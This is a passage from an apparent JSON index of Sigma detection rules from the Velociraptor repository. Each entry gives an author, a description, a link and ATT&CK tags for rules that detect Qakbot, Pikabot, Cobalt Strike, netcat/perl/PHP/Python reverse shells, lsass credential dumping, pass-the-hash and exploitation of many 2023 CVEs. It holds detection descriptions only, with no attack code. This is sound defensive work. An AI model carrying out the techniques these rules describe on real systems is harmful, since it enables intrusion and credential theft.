Qakbot activity.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Qakbot\\proc_creation_win_malware_qakbot_rundll32_execution.yaml", "tags": ["attack.defense_evasion", "attack.execution", "detection.emerging_threats", "windows", "sysmon", "malware.qakbot"], "title": "Potential Qakbot Rundll32 Execution"}, {"author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects executing python with keywords related to network activity that could indicate a potential reverse shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_python_reverse_shell.yaml", "tags": ["attack.execution", "os.linux"], "title": "Potential Python Reverse Shell"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects the execution of rundll32 that leads to the invocation of legitimate Windows binaries.\nThe malware Pikabot has been seen to use this technique for process hollowing through hard-coded Windows binaries\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Pikabot\\proc_creation_win_malware_pikabot_rundll32_hollowing.yaml", "tags": ["attack.defense_evasion", "attack.t1055.012", "detection.emerging_threats"], "title": "Potential Pikabot Hollowing Activity - Suspicious Process Created By Rundll32.EXE"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects the execution of rundll32 that leads to system discovery activity, such as incl. network, user info and domain groups.\nThe malware Pikabot has been seen to use this technique as part of its C2-botnet registration with a short collection time frame (less than 1 minute).\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Pikabot\\proc_creation_win_malware_pikabot_rundll32_discovery.yaml", "tags": ["attack.discovery", "attack.t1016", "attack.t1049", "attack.t1087", "detection.emerging_threats"], "title": "Potential Pikabot Discovery Activity - Suspicious Process Created By Rundll32.EXE"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects the execution of rundll32 that leads to an external network connection.\nThe malware Pikabot has been seen to use this technique to initiate C2-communication through hard-coded Windows binaries.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Pikabot\\net_connection_win_malware_pikabot_rundll32_activity.yaml", "tags": ["attack.command_and_control", "attack.t1573", "detection.emerging_threats", "windows", "malware.pikabot"], "title": "Potential Pikabot C2 Activity - Suspicious Process Created By Rundll32.EXE"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects the execution of rundll32 that leads to an external network connection.\nThe malware Pikabot has been seen to use this technique to initiate C2-communication through hard-coded Windows binaries.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Pikabot\\net_connection_win_malware_pikabot_rundll32_activity_EVTX.yaml", "tags": ["attack.command_and_control", "attack.t1573", "detection.emerging_threats", "windows", "malware.pikabot", "evtx", "sysmon"], "title": "Potential Pikabot C2 Activity - Suspicious Process Created By Rundll32.EXE"}, {"author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of the perl binary with the \"-e\" flag and common strings related to potential reverse shell activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_perl_reverse_shell.yaml", "tags": ["attack.execution", "os.linux"], "title": "Potential Perl Reverse Shell Execution"}, {"author": "Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)", "description": "Detects the attack technique pass the hash which is used to move laterally inside the network", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\pth\\win_security_potential_pass_the_hash.yaml", "tags": ["attack.lateral_movement", "attack.t1550.002", "car.2016-04-004"], "title": "Potential Pass the Hash Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential execution of the PowerShell script POWERTRASH", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\FIN7\\posh_ps_apt_fin7_powertrash_execution.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.g0046", "detection.emerging_threats"], "title": "Potential POWERTRASH Script Execution"}, {"author": "@d4ns4n_", "description": "Detects usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_php_reverse_shell.yaml", "tags": ["attack.execution", "os.linux"], "title": "Potential PHP Reverse Shell"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of \"rundll32\" with potential obfuscated ordinal calls", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_obfuscated_ordinal_call.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Potential Obfuscated Ordinal Call Via Rundll32"}, {"author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of netcat with the \"-e\" flag followed by common shells. This could be a sign of a potential reverse shell setup.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_netcat_reverse_shell.yaml", "tags": ["attack.execution", "attack.t1059", "os.linux"], "title": "Potential Netcat Reverse Shell Execution"}, {"author": "Teymur Kheirkhabarov, Ecco, Florian Roth", "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\proc_creation_win_hktl_meterpreter_getsystem.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.001", "attack.t1134.002", "windows", "evtx", "cobalt_strike"], "title": "Potential Meterpreter/CobaltStrike Activity"}, {"author": "Teymur Kheirkhabarov, Ecco, Florian Roth", "description": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\sysmon_proc_creation_win_hktl_meterpreter_getsystem.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.001", "attack.t1134.002", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Potential Meterpreter/CobaltStrike Activity"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects RDP session hijacking by using MSTSC shadowing", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_mstsc_rdp_hijack_shadowing.yaml", "tags": ["attack.lateral_movement", "attack.t1563.002", "windows", "evtx"], "title": "Potential MSTSC Shadowing Activity"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects file indicators of potential exploitation of MOVEit CVE-2023-34362.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-34362-MOVEit-Transfer-Exploit\\file_event_win_exploit_cve_2023_34362_moveit_transfer.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.34362", "detection.emerging_threats"], "title": "Potential MOVEit Transfer CVE-2023-34362 Exploitation"}, {"author": "Joseph Kamau", "description": "Detects the injection of code by overwriting the memory map of a Linux process using the \"dd\" Linux command.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_dd_process_injection.yaml", "tags": ["attack.defense_evasion", "attack.t1055.009", "os.linux"], "title": "Potential Linux Process Code Injection Via DD Utility"}, {"author": "Muhammad Faisal", "description": "Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_ssm_agent_abuse.yaml", "tags": ["attack.command_and_control", "attack.persistence", "attack.t1219", "os.linux"], "title": "Potential Linux Amazon SSM Agent Hijacking"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Thurein Oo", "description": "Detects exploitation attempts of CVE-2023-43261 and information disclosure in Milesight UR5X, UR32L, UR32, UR35, UR41 before v35.3.0.7 that allows attackers to access sensitive router components in access logs.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-43261\\web_exploit_cve_2023_43261_milesight_information_disclosure.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.43621", "detection.emerging_threats"], "title": "Potential Information Disclosure CVE-2023-43261 Exploitation - Web"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Thurein Oo", "description": "Detects exploitation attempts of CVE-2023-43261 and information disclosure in Milesight UR5X, UR32L, UR32, UR35, UR41 before v35.3.0.7 that allows attackers to access sensitive router components in proxy logs.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-43261\\proxy_exploit_cve_2023_43261_milesight_information_disclosure.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.43621", "detection.emerging_threats"], "title": "Potential Information Disclosure CVE-2023-43261 Exploitation - Proxy"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects the use of grep to discover specific files created by the GobRAT malware", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_malware_gobrat_grep_payload_discovery.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "Potential GobRAT File Discovery Via Grep"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali", "description": "Detects potential exploitation attempt of undocumented Windows Server Pre Auth Remote Code Execution (RCE)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\Windows-Server-Unknown-Exploit\\proc_creation_win_exploit_other_win_server_undocumented_rce.yaml", "tags": ["detection.emerging_threats", "attack.initial_access", "attack.t1190"], "title": "Potential Exploitation Attempt Of Undocumented WindowsServer RCE"}, {"author": "Aaron Stratton", "description": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\dcom\\proc_creation_win_office_excel_dcom_lateral_movement.yaml", "tags": ["attack.t1021.003", "attack.execution", "attack.lateral_movement", "windows", "evtx"], "title": "Potential Excel.EXE DCOM Lateral Movement Via ActivateMicrosoftApp"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a registry value in the \".wav\\OpenWithProgIds\" key with an uncommon name. This could be related to SNAKE Malware as reported by CISA", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\registry_set_malware_snake_encrypted_key.yaml", "tags": ["attack.persistence", "detection.emerging_threats"], "title": "Potential Encrypted Registry Blob Related To SNAKE Malware"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of \"find\" binary in a suspicious manner to perform discovery", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_find_execution.yaml", "tags": ["attack.discovery", "attack.t1083", "os.linux"], "title": "Potential Discovery Activity Using Find - Linux"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects Windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\lsass\\win_werfault_susp_lsass_credential_dump.yaml", "tags": ["attack.credential_access", "attack.t1003.001", "windows", "evtx"], "title": "Potential Credential Dumping Via WER - Application"}, {"author": "oscd.community, Natalia Shornikova", "description": "Detects remote thread creation by PowerShell processes into \"lsass.exe\"", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\sysmon\\create_remote_thread\\create_remote_thread_win_powershell_lsass.yaml", "tags": ["attack.credential_access", "attack.t1003.001", "sysmon", "windows", "evtx", "generic"], "title": "Potential Credential Dumping Attempt Via PowerShell Remote Thread"}, {"author": "Seth Hanford", "description": "Detects listing of the inodes of the \"/\" directory to determine if the we are running inside of a container.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_inod_listing.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "Potential Container Discovery Via Inodes Listing"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the 3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_susp_update.yaml", "tags": ["attack.defense_evasion", "attack.t1218", "attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Compromised 3CXDesktopApp Update Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of known compromised version of 3CXDesktopApp", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_execution_evtx.yaml", "tags": ["attack.defense_evasion", "attack.t1218", "attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Compromised 3CXDesktopApp Execution - Sysmon"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of known compromised version of 3CXDesktopApp", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_execution.yaml", "tags": ["attack.defense_evasion", "attack.t1218", "attack.execution", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Compromised 3CXDesktopApp Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\dns_query_evtx_win_malware_3cx_compromise.yaml", "tags": ["attack.command_and_control", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Compromised 3CXDesktopApp Beaconing Activity - DNS EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\dns_query_sysmon_win_malware_3cx_compromise.yaml", "tags": ["attack.command_and_control", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Potential Compromised 3CXDesktopApp Beaconing Activity - DNS EVTX"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential process patterns related to Cobalt Strike beacon activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\proc_creation_win_hktl_cobaltstrike_process_patterns.yaml", "tags": ["attack.execution", "attack.t1059", "windows", "evtx", "cobalt_strike"], "title": "Potential CobaltStrike Process Patterns"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential process patterns related to Cobalt Strike beacon activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\sysmon_proc_creation_win_hktl_cobaltstrike_process_patterns.yaml", "tags": ["attack.execution", "attack.t1059", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Potential CobaltStrike Process Patterns"}, {"author": "X__Junior", "description": "Detects a specific URL pattern containing a specific extension and parameters pointing to an IP address. This pattern was seen being used by RomCOM potentially exploiting CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\proxy_exploit_cve_2023_36884_office_windows_html_rce_extenstion_ip_pattern_traffic.yaml", "tags": ["attack.command_and_control", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2303-36884 URL Request Pattern Traffic"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Bhavin Patel (STRT)", "description": "Detects potential exploitation of CVE-2023-46214, a remote code execution (RCE) in Splunk Enterprise through insecure XML parsing\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-46214\\web_cve_2023_46214_rce_splunk_enterprise.yaml", "tags": ["attack.lateral_movement", "attack.t1210", "cve.2023.46214", "detection.emerging_threats"], "title": "Potential CVE-2023-46214 Exploitation Attempt"}, {"author": "X__Junior", "description": "Detects a unique pattern seen being used by RomCom potentially exploiting CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\proxy_exploit_cve_2023_36884_office_windows_html_rce.yaml", "tags": ["attack.command_and_control", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2023-36884 Exploitation Pattern"}, {"author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)", "description": "Detects a specific file being created in the recent folder of Office. These files have been seen being dropped during potential exploitations of CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\file_event_win_exploit_cve_2023_36884_office_windows_html_rce_file_patterns.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2023-36884 Exploitation Dropped File"}, {"author": "X__Junior", "description": "Detects a unique URL marker seen being used by RomCom potentially exploiting CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\proxy_exploit_cve_2023_36884_office_windows_html_rce_url_marker_traffic.yaml", "tags": ["attack.command_and_control", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2023-36884 Exploitation - URL Marker"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects access to a file share with a naming schema seen being used during exploitation of CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\win_security_exploit_cve_2023_36884_office_windows_html_rce_share_access_pattern.yaml", "tags": ["attack.command_and_control", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2023-36884 Exploitation - Share Access"}, {"author": "X__Junior", "description": "Detects files seen being requested by RomCom while potentially exploiting CVE-2023-36884", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36884\\proxy_exploit_cve_2023_36884_office_windows_html_rce_traffic.yaml", "tags": ["attack.command_and_control", "cve.2023.36884", "detection.emerging_threats"], "title": "Potential CVE-2023-36884 Exploitation - File Downloads"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a \"Report.wer\" file in an uncommon folder structure. This could be a sign of potential exploitation of CVE-2023-36874.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36874\\file_event_win_exploit_cve_2023_36874_report_creation.yaml", "tags": ["attack.execution", "cve.2023.36874", "detection.emerging_threats"], "title": "Potential CVE-2023-36874 Exploitation - Uncommon Report.Wer Location"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a file named \"wermgr.exe\" being created in an uncommon directory. This could be a sign of potential exploitation of CVE-2023-36874.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36874\\file_event_win_exploit_cve_2023_36874_wermgr_creation.yaml", "tags": ["attack.execution", "cve.2023.36874", "detection.emerging_threats"], "title": "Potential CVE-2023-36874 Exploitation - Fake Wermgr.Exe Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of a renamed \"cmd\", \"powershell\" or \"powershell_ise\" binary. Attackers were seen using these binaries in a renamed form as \"wermgr.exe\" in exploitation of CVE-2023-36874", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-36874\\proc_creation_win_exploit_cve_2023_36874_fake_wermgr.yaml", "tags": ["attack.execution", "cve.2023.36874", "detection.emerging_threats"], "title": "Potential CVE-2023-36874 Exploitation - Fake Wermgr Execution"}, {"author": "Sergio Palacios Dominguez, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects indicators of potential exploitation of CVE-2023-27997 in Frotigate weblogs.\nTo avoid false positives it is best to look for successive requests to the endpoints mentioned as well as weird values of the \"enc\" parameter\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-27997\\web_cve_2023_27997_pre_authentication_rce.yaml", "tags": ["cve.2023.27997", "attack.initial_access", "attack.t1190", "detection.emerging_threats"], "title": "Potential CVE-2023-27997 Exploitation Indicators"}, {"author": "Gregory", "description": "Detects suspicious \".hta\" file creation in the startup folder by Foxit Reader. This can be an indication of CVE-2023-27363 exploitation.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-27363\\file_event_win_cve_2023_27363_foxit_rce.yaml", "tags": ["attack.persistence", "attack.t1505.001", "cve.2023.27363", "detection.emerging_threats"], "title": "Potential CVE-2023-27363 Exploitation - HTA File Creation By FoxitPDFReader"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a potential exploitation attempt of CVE-2023-25717 a Remote Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-25717\\web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.25717", "detection.emerging_threats"], "title": "Potential CVE-2023-25717 Exploitation Attempt"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a potential exploitation attempt of CVE-2023-25157 a SQL injection in GeoServer", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-25157\\web_cve_2023_25157_geoserver_sql_injection.yaml", "tags": ["attack.initial_access", "cve.2023.25157", "detection.emerging_threats"], "title": "Potential CVE-2023-25157 Exploitation Attempt"}, {"author": "Bhabesh Raj", "description": "Detects the potential exploitation attempt of CVE-2023-23752 an Improper access check, in web service endpoints in Joomla", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-23752\\lnx_web_cve_2023_23752_joomla_exploit_attempt.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.23752", "detection.emerging_threats"], "title": "Potential CVE-2023-23752 Exploitation Attempt"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects (failed) outbound connection attempts to internet facing SMB servers. This could be a sign of potential exploitation attempts of CVE-2023-23397.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-23397\\win_smbclient_connectivity_exploit_cve_2023_23397_outlook_remote_file.yaml", "tags": ["attack.exfiltration", "cve.2023.23397", "detection.emerging_threats", "windows", "smb"], "title": "Potential CVE-2023-23397 Exploitation Attempt - SMB"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects potential exploitation attempt of CVE-2023-2283 an authentication bypass in libSSH. The exploitation method causes an error message stating that keys for curve25519 could not be generated. It is an error message that is a sign of an exploitation attempt. It is not a sign of a successful exploitation.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-2283\\lnx_sshd_exploit_cve_2023_2283_libssh_authentication_bypass.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2023.2283", "detection.emerging_threats"], "title": "Potential CVE-2023-2283 Exploitation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects creation of a new user profile with a specific username, seen being used by some variants of the COLDSTEEL RAT.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\registry_set_malware_coldsteel_created_users.yaml", "tags": ["attack.persistence", "detection.emerging_threats"], "title": "Potential COLDSTEEL RAT Windows User Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a file named \"dllhost.exe\" in the \"C:\\users\\public\\Documents\\\" directory. Seen being used by the COLDSTEEL RAT in some of its variants.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\file_event_win_malware_coldsteel_renamed_cmd.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "Potential COLDSTEEL RAT File Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\image_load_malware_coldsteel_persistence_service_dll_evtx.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "Potential COLDSTEEL Persistence Service DLL Load - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\image_load_malware_coldsteel_persistence_service_dll.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel"], "title": "Potential COLDSTEEL Persistence Service DLL Load"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects the creation of a file in a specific location and with a specific name related to COLDSTEEL RAT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\file_event_win_malware_coldsteel_service_dll_creation.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "Potential COLDSTEEL Persistence Service DLL Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mustang-Panda-Australia-Campaign\\proc_creation_win_apt_mustang_panda_indicators_evtx.yaml", "tags": ["attack.execution", "attack.g0129", "detection.emerging_threats", "windows", "apt.mustang_panda", "evtx"], "title": "Potential APT Mustang Panda Activity Against Australian Gov - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Mustang-Panda-Australia-Campaign\\proc_creation_win_apt_mustang_panda_indicators.yaml", "tags": ["attack.execution", "attack.g0129", "detection.emerging_threats", "windows", "apt.mustang_panda"], "title": "Potential APT Mustang Panda Activity Against Australian Gov"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects PowerShell script file creation with specific name or suffix which was seen being used often by FIN7 PowerShell scripts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\FIN7\\file_event_win_apt_fin7_powershell_scripts_naming_convention.yaml", "tags": ["attack.execution", "attack.g0046", "detection.emerging_threats", "windows", "evtx"], "title": "Potential APT FIN7 Related PowerShell Script Created"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by FIN7 as reported by WithSecureLabs for reconnaissance and POWERTRASH execution", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\FIN7\\proc_creation_win_apt_fin7_powertrash_lateral_movement.yaml", "tags": ["attack.execution", "attack.g0046", "detection.emerging_threats", "windows", "evtx"], "title": "Potential APT FIN7 Reconnaissance/POWERTRASH Related Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by FIN7 as reported by WithSecureLabs for reconnaissance and POWERTRASH execution", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\FIN7\\proc_creation_win_apt_fin7_powertrash_lateral_movement_evtx.yaml", "tags": ["attack.execution", "attack.g0046", "detection.emerging_threats", "windows", "evtx"], "title": "Potential APT FIN7 Reconnaissance/POWERTRASH Related Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of the POWERHOLD script seen used by FIN7 as reported by WithSecureLabs", "link": 